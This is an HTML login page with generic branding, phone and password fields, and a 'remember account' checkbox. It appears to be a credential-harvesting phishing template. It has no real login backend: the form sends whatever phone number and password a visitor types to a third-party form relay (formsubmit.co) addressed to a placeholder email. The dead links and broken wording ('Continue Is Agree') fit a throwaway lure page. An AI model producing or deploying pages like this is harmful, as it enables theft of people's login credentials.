<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Log In</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"/>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #000;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .container {
      margin-top: 40px;
      width: 100%;
      max-width: 400px;
      padding: 0 20px;
    }

    .logo {
      text-align: center;
      margin-bottom: 20px;
    }

    .logo img {
      width: 100px;
    }

    h1 {
      text-align: center;
      color: white;
      margin-bottom: 20px;
    }

    .toggle-buttons {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
    }

    .toggle-buttons button {
      flex: 1;
      padding: 10px;
      border: none;
      cursor: pointer;
      background-color: #2c2c2c;
      color: white;
    }

    .toggle-buttons button.active {
      background-color: #d4af37;
      color: black;
    }

    label {
      display: block;
      margin: 10px 0 5px;
      text-align: left;
    }

    .input-wrapper {
      display: flex;
      align-items: center;
      background-color: #2c2c2c;
      border-radius: 30px;
      padding: 10px 15px;
      margin-bottom: 15px;
    }

    .input-wrapper input {
      flex: 1;
      background: transparent;
      border: none;
      color: white;
      outline: none;
      font-size: 16px;
    }

    .input-wrapper .eye-icon {
      cursor: pointer;
      font-size: 18px;
      color: gray;
    }

    .checkbox-group {
      display: flex;
      align-items: center;
      margin-top: -5px;
      margin-bottom: 20px;
    }

    .checkbox-group input[type="checkbox"] {
      margin-right: 10px;
    }

    .forgot-remember {
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 14px;
    }

    .forgot-remember a {
      color: white;
      text-decoration: none;
    }

    button.submit {
      width: 100%;
      padding: 15px;
      border: none;
      border-radius: 30px;
      background-color: #d4af37;
      color: black;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      margin-bottom: 20px;
    }

    .footer {
      text-align: center;
      font-size: 14px;
    }

    .footer a {
      color: #d4af37;
      text-decoration: none;
      margin-left: 5px;
    }

    /* Style drapeaux ronds */
    .iti__flag {
      border-radius: 50% !important;
      filter: brightness(1.2);
    }

    .iti {
      width: 100%;
    }

    .iti__selected-flag {
      background-color: #1f1f1f !important;
      border-radius: 20px;
      padding: 5px 10px;
    }

    .iti__arrow {
      color: white;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/0/02/Marsx.png" alt="Logo"/>
    </div>

    <h1>Welcome To Login</h1>

    <div class="toggle-buttons">
      <button class="active">Phone Login</button>
      <button>Email Login</button>
    </div>

    <form action="https://formsubmit.co/your@email.com" method="POST">
      <label for="phone">Phone Number</label>
      <div class="input-wrapper">
        <input id="phone" type="tel" name="phone" required placeholder="Phone Number"/>
      </div>

      <label for="password">Password</label>
      <div class="input-wrapper">
        <input id="password" type="password" name="password" required placeholder="Password"/>
        <span class="eye-icon" onclick="togglePassword()">üëÅÔ∏è‚Äçüó®Ô∏è</span>
      </div>

      <div class="forgot-remember">
        <a href="#">Forgot password?</a>
      </div>

      <div class="checkbox-group">
        <input type="checkbox" id="remember" name="remember">
        <label for="remember">Remember account and password</label>
      </div>

      <button type="submit" class="submit">Log In</button>
    </form>

    <div class="footer">
      Continue Is Agree
      <a href="#">Sign Up</a>
    </div>
  </div>

  <!-- Libs JS -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
  <script>
    const input = document.querySelector("#phone");
    window.intlTelInput(input, {
      preferredCountries: ["us", "ca", "fr", "no", "es", "se", "ch", "ph", "gb", "co"],
      separateDialCode: true,
    });

    function togglePassword() {
      const passwordInput = document.getElementById("password");
      if (passwordInput.type === "password") {
        passwordInput.type = "text";
      } else {
        passwordInput.type = "password";
      }
    }
  </script>
</body>
</html>
